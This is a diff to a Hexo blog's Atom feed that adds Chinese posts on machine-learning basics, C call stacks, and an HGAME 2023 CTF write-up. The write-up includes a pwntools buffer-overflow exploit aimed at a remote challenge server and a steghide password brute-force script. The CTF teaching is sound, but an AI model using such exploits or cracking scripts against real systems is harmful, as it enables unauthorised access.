@@ -6,7 +6,7 @@
   <link href="http://antihypezero.github.io/atom.xml" rel="self"/>
   
   <link href="http://antihypezero.github.io/"/>
-  <updated>2022-10-06T13:31:29.359Z</updated>
+  <updated>2023-01-08T14:53:12.192Z</updated>
   <id>http://antihypezero.github.io/</id>
   
   <author>
@@ -15,6 +15,67 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title></title>
+    <link href="http://antihypezero.github.io/2023/01/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
+    <id>http://antihypezero.github.io/2023/01/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/</id>
+    <published>2023-01-08T14:53:06.745Z</published>
+    <updated>2023-01-08T14:53:12.192Z</updated>
+    
+    <content type="html"><![CDATA[<hr><h2 id="title-机器学习"><a href="#title-机器学习" class="headerlink" title="title:机器学习"></a>title:机器学习</h2><h2 id="监督学习"><a href="#监督学习" class="headerlink" title="监督学习"></a>监督学习</h2><p><strong>标签，是连续值还是离散值，将监督学习问题分为分类问题和回归问题，其中分类问题的标签是离散值，回归问题的标签是连续值</strong>。</p><p>example:</p><p><a href="https://imgse.com/i/pSVoOWq"><img src="https://s1.ax1x.com/2023/01/08/pSVoOWq.png" alt="pSVoOWq.png" style="zoom: 50%;" /></a></p><p><a href="https://imgse.com/i/pSVovlV"><img src="https://s1.ax1x.com/2023/01/08/pSVovlV.png" alt="pSVovlV.png" style="zoom: 50%;" /></a></p><h2 id="非监督学习"><a href="#非监督学习" class="headerlink" title="非监督学习"></a>非监督学习</h2><p><strong>无监督学习是一种机器学习的训练方式，它本质上是一个统计手段，在没有标签的数据里可以发现潜在的一些结构的一种训练方式。</strong></p><p><a href="https://imgse.com/i/pSVHHTe"><img src="https://s1.ax1x.com/2023/01/08/pSVHHTe.png" alt="pSVHHTe.png" style="zoom:50%;" /></a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;hr&gt;
+&lt;h2 id=&quot;title-机器学习&quot;&gt;&lt;a href=&quot;#title-机器学习&quot; class=&quot;headerlink&quot; title=&quot;title:机器学习&quot;&gt;&lt;/a&gt;title:机器学习&lt;/h2&gt;&lt;h2 id=&quot;监督学习&quot;&gt;&lt;a href=&quot;#监督学习&quot; class=</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>HGAME 2023</title>
+    <link href="http://antihypezero.github.io/2023/01/05/HGAME-2023/"/>
+    <id>http://antihypezero.github.io/2023/01/05/HGAME-2023/</id>
+    <published>2023-01-05T14:04:04.045Z</published>
+    <updated>2023-01-06T16:14:18.883Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h1><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h3><p>直接nc</p><p><img src="https://s1.ax1x.com/2023/01/06/pSEmC2q.png" alt="pSEmC2q.png"></p><h3 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h3><p>最基础的栈溢出题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;61.147.171.105&#x27;</span>, <span class="number">60099</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span> + p64(<span class="number">0x400176</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h3><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Sign-In"><a href="#Sign-In" class="headerlink" title="Sign In"></a>Sign In</h3><p>直接在线解码</p><p><a href="https://imgse.com/i/pSEugvq"><img src="https://s1.ax1x.com/2023/01/06/pSEugvq.png" alt="pSEugvq.png"></a></p><h3 id="神秘的海报"><a href="#神秘的海报" class="headerlink" title="神秘的海报"></a>神秘的海报</h3><p>看到png文件，用zsteg</p><p><a href="https://imgse.com/i/pSE0wNj"><img src="https://s1.ax1x.com/2023/01/06/pSE0wNj.png" alt="pSE0wNj.png"></a></p><p>得到了前一部分，后面是网址，点开下载得到一个wav音频文件</p><p>我们可以使用steghide获取密文，首先获取密码，采用爆破的形式</p><p>代码如下：<del>我是一个搬运工</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    stegoFile = <span class="string">&#x27;Bossanova.wav&#x27;</span> <span class="comment">#待破解文件</span></span><br><span class="line">    extractFile = <span class="string">&#x27;passwd.txt&#x27;</span> <span class="comment">#输出密文</span></span><br><span class="line">    passFile = <span class="string">&#x27;english.dic&#x27;</span> <span class="comment">#字典，我用的是Elcomsoft Password Recovery里的english.dic</span></span><br><span class="line"></span><br><span class="line">    errors = [<span class="string">&#x27;could not extract&#x27;</span>, <span class="string">&#x27;steghide --help&#x27;</span>, <span class="string">&#x27;Syntax error&#x27;</span>]</span><br><span class="line">    cmdFormat = <span class="string">&#x27;steghide extract -sf &quot;%s&quot; -xf &quot;%s&quot; -p &quot;%s&quot;&#x27;</span></span><br><span class="line">    f = <span class="built_in">open</span>(passFile, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        cmd = cmdFormat % (stegoFile, extractFile, line.strip())</span><br><span class="line">        p = Popen(cmd, shell=<span class="literal">True</span>, stdout=PIPE, stderr=STDOUT)</span><br><span class="line">        content = <span class="built_in">str</span>(p.stdout.read(), <span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> err <span class="keyword">in</span> errors:</span><br><span class="line">            <span class="keyword">if</span> err <span class="keyword">in</span> content:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(content),</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;the passphrase is %s&#x27;</span> % (line.strip()))</span><br><span class="line">            f.close()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    foo()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    foo()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>获得密文：123456 </p><p><a href="https://imgse.com/i/pSEBgzt"><img src="https://s1.ax1x.com/2023/01/06/pSEBgzt.png" alt="pSEBgzt.png"></a></p><p><a href="https://imgse.com/i/pSEBWsf"><img src="https://s1.ax1x.com/2023/01/06/pSEBWsf.png" alt="pSEBWsf.png"></a></p><p>这里是复现，所以存在过了</p><p><a href="https://imgse.com/i/pSEB7Js"><img src="https://s1.ax1x.com/2023/01/06/pSEB7Js.png" alt="pSEB7Js.png"></a></p><p>两者拼接，即得flag</p><h3 id="e99p1ant-wan"><a href="#e99p1ant-wan" class="headerlink" title="e99p1ant_wan"></a>e99p1ant_wan</h3><p>根据提示，使用CRC检验，得出正确的长和宽，在010Editor里修改即得flag</p><p>脚本如下：    <del>我是一个搬运工</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;e.png&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    all_b = f.read()</span><br><span class="line">    crc32key = <span class="built_in">int</span>(all_b[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">    data = <span class="built_in">bytearray</span>(all_b[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line">    n = <span class="number">4095</span>  </span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n):  </span><br><span class="line">        width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))  </span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                data[x + <span class="number">4</span>] = width[x]</span><br><span class="line">                data[x + <span class="number">8</span>] = height[x]</span><br><span class="line">            crc32result = zlib.crc32(data)</span><br><span class="line">            <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">                </span><br><span class="line">                <span class="built_in">print</span>(data.<span class="built_in">hex</span>())</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;宽为：&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(width)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;高为：&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(height)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pSEUnF1"><img src="https://s1.ax1x.com/2023/01/06/pSEUnF1.png" alt="pSEUnF1.png"></a></p><p><a href="https://imgse.com/i/pSEUQSK"><img src="https://s1.ax1x.com/2023/01/06/pSEUQSK.png" alt="pSEUQSK.png"></a></p><p><a href="https://imgse.com/i/pSEU1yD"><img src="https://s1.ax1x.com/2023/01/06/pSEU1yD.png" alt="pSEU1yD.png"></a></p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="test-your-IDA"><a href="#test-your-IDA" class="headerlink" title="test your IDA"></a>test your IDA</h3><p>将程序放入IDA中，ctrl+shift+F12，可以看到flag</p><p><a href="https://imgse.com/i/pSErmuV"><img src="https://s1.ax1x.com/2023/01/06/pSErmuV.png" alt="pSErmuV.png"></a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;WEEK1&quot;&gt;&lt;a href=&quot;#WEEK1&quot; class=&quot;headerlink&quot; title=&quot;WEEK1&quot;&gt;&lt;/a&gt;WEEK1&lt;/h1&gt;&lt;h2 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#pwn&quot; class=&quot;headerlink&quot; title=&quot;pwn&quot;&gt;&lt;/</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>C语言函数调用栈(一)</title>
+    <link href="http://antihypezero.github.io/2022/10/07/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88(%E4%B8%80)/"/>
+    <id>http://antihypezero.github.io/2022/10/07/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88(%E4%B8%80)/</id>
+    <published>2022-10-07T14:44:17.568Z</published>
+    <updated>2022-10-07T14:51:56.577Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>C语言程序的执行过程可以看作连续的函数调用，一个函数执行结束后，程序要回到该函数指令的下一条指令处继续执行。函数调用过程通常使用堆栈实现，每个用户态进程对应一个调用栈结构。编译器使用堆栈传递函数参数、保存返回地址、临时保存寄存器原有值(即函数调用的上下文)已被恢复以及存储本地局部变量。</strong></p><blockquote><p>本文引用<a href="https://www.cnblogs.com/clover-toeic/p/3755401.html">https://www.cnblogs.com/clover-toeic/p/3755401.html</a></p></blockquote>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;C语言程序的执行过程可以看作连续的函数调用，一个函数执行结束后，程序要回到该函数指令的下一条指令处继续执行。函数调用过程通常使用堆栈实现，每个用户态进程对应一个调用栈结构。编译器使用堆栈传递函数参数、保存返回地址、临时保存寄存器原有值(即函数调用的上下文)已</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>ELF文件格式</title>
